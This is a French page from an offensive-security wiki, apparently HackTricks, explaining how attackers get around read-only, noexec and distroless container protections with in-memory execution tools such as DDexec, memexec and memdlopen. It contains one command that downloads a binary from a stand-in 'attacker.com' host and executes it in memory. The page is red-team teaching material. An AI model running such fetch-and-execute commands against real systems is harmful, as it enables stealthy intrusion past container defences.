# Contourner les protections du système de fichiers : lecture seule / sans exécution / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Vidéos

Les vidéos suivantes expliquent plus en détail les techniques mentionnées sur cette page :<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Scénario de système de fichiers en lecture seule / sans exécution

Dans un conteneur, vous pouvez monter le système de fichiers racine en lecture seule en définissant **`readOnlyRootFilesystem: true`** dans le contexte de sécurité.<sup>[[3]](#references)</sup> Par exemple :

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Un système de fichiers racine en lecture seule ne rend pas les volumes montés séparément accessibles uniquement en lecture. Docker traite **`/dev/shm`** comme un montage IPC, tandis que les options tmpfs telles que `rw` et `noexec` sont des choix de configuration du runtime ; vérifiez les options de montage du conteneur cible avant de vous fier à l'un ou l'autre de ces comportements.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Du point de vue d'une équipe red-team, cette combinaison peut rendre difficile le téléchargement et l'exécution de binaires qui ne sont pas déjà disponibles (par exemple, des backdoors ou des outils d'énumération).<sup>[[4]](#references)[[5]](#references)</sup>

## Contournement le plus simple : les scripts

Un montage `noexec` bloque l'exécution directe des binaires présents sur ce montage, mais un interpréteur peut toujours lire et interpréter un script. Si `sh` ou `python` est disponible, vous pouvez donc exécuter un script shell ou Python via cet interpréteur.<sup>[[5]](#references)</sup>

Cela ne sert à rien si l'outil nécessaire est lui-même un binaire.<sup>[[5]](#references)</sup>

## Contournements en mémoire

Lorsque l'exécution directe depuis un chemin monté est bloquée, une possibilité consiste à charger l'ELF en mémoire et à l'exécuter via un chemin en mémoire. Cela évite la vérification `noexec` sur ce montage, mais ne supprime pas les autres contrôles du noyau, des permissions ou des politiques.<sup>[[5]](#references)[[6]](#references)</sup>

### Contournement par FD + appel système exec

Si un runtime de script peut accéder à l'interface Linux correspondante, il peut créer un descripteur de fichier anonyme en RAM avec **`memfd_create(2)`**, y écrire les octets de l'ELF, puis utiliser un mécanisme d'exécution basé sur un descripteur de fichier. Le projet [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) génère du code Python, Perl ou Ruby compressé et encodé en base64 pour ce processus.<sup>[[6]](#references)[[7]](#references)</sup>

Le projet documente actuellement les cibles Python, Perl et Ruby ; PHP ou Node nécessitent une technique ou une extension spécifique à leur runtime. L'absence d'un générateur pour un langage ne signifie donc pas que l'exécution en mémoire est impossible.<sup>[[6]](#references)[[12]](#references)</sup>

Consultez [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) pour une couverture plus large de l'exécution depuis des fichiers anonymes, des méthodes de staging associées, ainsi que de la détection et de la collecte forensique.

> [!WARNING]
> Un exécutable ordinaire écrit dans **`/dev/shm`** reste soumis à l'option **`noexec`** de ce montage ; le fait de l'ouvrir simplement via un descripteur de fichier ordinaire ne modifie pas la politique du montage.<sup>[[5]](#references)</sup>
>
> La méthode exacte d'exécution en mémoire dépend également du runtime, de l'architecture, du noyau et des permissions disponibles.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) écrit un stager et un loader dans le processus shell en cours d'exécution via **`/proc/self/mem`**, puis transfère le contrôle à ce code.<sup>[[8]](#references)</sup>

Cela permet au processus de charger un binaire fourni sans avoir à le placer d'abord sur un système de fichiers exécutable.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** peut charger et **exécuter** du shellcode ou un binaire depuis la **mémoire**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Pour plus d’informations sur cette technique, consultez le dépôt GitHub ou :

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) est une implémentation de DDexec exécutée en tant que daemon. Son daemon écoute les requêtes contenant des arguments et les octets bruts du programme, crée un processus enfant pour charger et exécuter chaque programme, et conserve le processus parent comme serveur.<sup>[[9]](#references)</sup>

Le dépôt inclut un exemple d’utilisation de **memexec pour exécuter des binaires depuis un reverse shell PHP** dans [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Dans un but similaire à DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) est une implémentation sans fichier de `dlopen()` pour un objet partagé ou un programme. Son README documente actuellement la prise en charge d’ARM64 ; vérifiez donc l’architecture cible avant de l’utiliser.<sup>[[10]](#references)</sup>

## Contournement de Distroless

Pour une explication dédiée de **ce qu’est réellement distroless**, des cas où cela est utile ou non, et de la manière dont cela modifie les techniques de post-exploitation dans les conteneurs, consultez :

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Qu’est-ce que distroless

Les images distroless ne contiennent que l’application et ses dépendances d’exécution ; les images officielles omettent les gestionnaires de paquets, les shells et les autres programmes attendus dans une distribution Linux standard.<sup>[[11]](#references)</sup>

Limiter l’image d’exécution à ces dépendances réduit les logiciels présents en production ainsi que la quantité à analyser et à suivre.<sup>[[11]](#references)</sup>

### Reverse Shell

Dans un conteneur distroless, vous pourriez **ne pas trouver `sh` ou `bash`** pour obtenir un shell classique, ni d’utilitaires courants comme `ls`, `whoami` ou `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Par conséquent, un reverse shell classique basé sur un shell ou une énumération reposant sur des utilitaires peut ne pas fonctionner.<sup>[[11]](#references)</sup>

Si l’application compromise inclut un runtime de langage (par exemple, Python pour une application Flask ou Node.js pour une application Node), une RCE peut tout de même utiliser ce runtime pour établir un canal de commande et inspecter le système via ses API.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Utilisez le langage de script disponible pour **énumérer le système** à l’aide de ses fonctionnalités.<sup>[[12]](#references)</sup>

En l’absence de protections **read-only/no-exec**, un canal de commande peut écrire des binaires sur un point de montage accessible en écriture et exécutable, puis les lancer ; vérifiez d’abord les options de montage et les permissions.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Lorsque ces protections sont présentes, utilisez les **techniques d’exécution en mémoire ci-dessus**, dans la mesure permise par le runtime, le kernel et les permissions.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Vous trouverez des **exemples** d’exploitation de vulnérabilités RCE pour obtenir des **reverse shells** en langage de script et exécuter des binaires depuis la mémoire dans [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Exploration de la manipulation de la mémoire Linux à des fins de furtivité et d’évasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Intrusions furtives avec DDexec-ng et dlopen() en mémoire - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Configurer un contexte de sécurité pour un pod ou un conteneur](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - page de manuel Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - page de manuel Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
